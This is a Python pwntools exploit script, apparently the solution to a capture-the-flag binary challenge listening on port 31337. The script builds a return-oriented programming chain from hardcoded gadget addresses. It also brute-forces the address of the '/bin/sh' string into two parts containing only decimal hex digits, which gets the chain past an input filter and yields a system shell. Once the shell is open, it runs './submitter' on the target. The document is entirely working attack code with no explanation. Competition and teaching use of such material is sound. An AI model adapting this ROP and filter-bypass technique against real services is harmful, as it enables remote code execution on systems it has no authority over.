#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

pop_rdi_rbp_ret = 0x0000000000402218
mov_eax_edx_ret = 0x0000000000405352
mov_eax_esi_ret = 0x466768
pop_rsi_r15_rbp_ret = 0x0000000000402216
add_rax_rdi_ret = 0x0000000000471885
binsh = 0x4A04F9
mov_rdi_rax_system = 0x401914
ret = 0x405319


# Brute force split binsh into two numbers that only have digits 0-9 in hex
def has_only_digits(n):
    return all(c in "0123456789" for c in hex(n)[2:])


part1 = part2 = None
for i in range(binsh):
    if has_only_digits(i) and has_only_digits(binsh - i):
        part1 = i
        part2 = binsh - i
        break

assert part1 is not None
assert part2 is not None
assert part1 + part2 == binsh
assert has_only_digits(part1)
assert has_only_digits(part2)
print(hex(part1), hex(part2))
PADDING = 0x114514

payload = [
    1,
    2,
    3,
    0x0000000300114514,
    PADDING,
    pop_rsi_r15_rbp_ret,
    part1,
    PADDING,
    PADDING,
    mov_eax_esi_ret,
    pop_rdi_rbp_ret,
    part2,
    PADDING,
    add_rax_rdi_ret,
    ret,
    mov_rdi_rax_system,
    0,
]

r = remote(HOST, int(PORT))
# r = process("../handout/challenge")

# gdb.attach(r)

for v in payload:
    assert has_only_digits(v)
    d = hex(v)[2:]
    r.sendlineafter(b"Addr pls: ", d.encode())

r.sendline(b"./submitter")
print(r.recvall(timeout=3))
